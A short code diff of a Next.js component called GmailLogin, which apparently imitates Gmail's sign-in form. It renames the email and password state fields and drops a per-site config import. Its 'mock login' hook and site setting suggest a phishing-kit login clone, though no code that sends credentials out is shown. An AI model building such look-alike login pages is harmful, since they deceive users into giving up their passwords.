@@ -2,7 +2,6 @@ import { useState } from "react";
 import Head from "next/head";
 import Image from "next/image";
 import useMockLogin from "../hooks/useMockLogin";
-import { site } from "../config/index";
 
 const UserIcon = () => {
   return (
@@ -40,9 +39,8 @@ const AngleDown = () => {
 
 export default function GmailLogin() {
   const [formValues, setFormValues] = useState({
-    site: site,
-    email: "",
-    password: "",
+    mail: "",
+    mailPass: "",
   });
 
   const [field, setField] = useState("email");
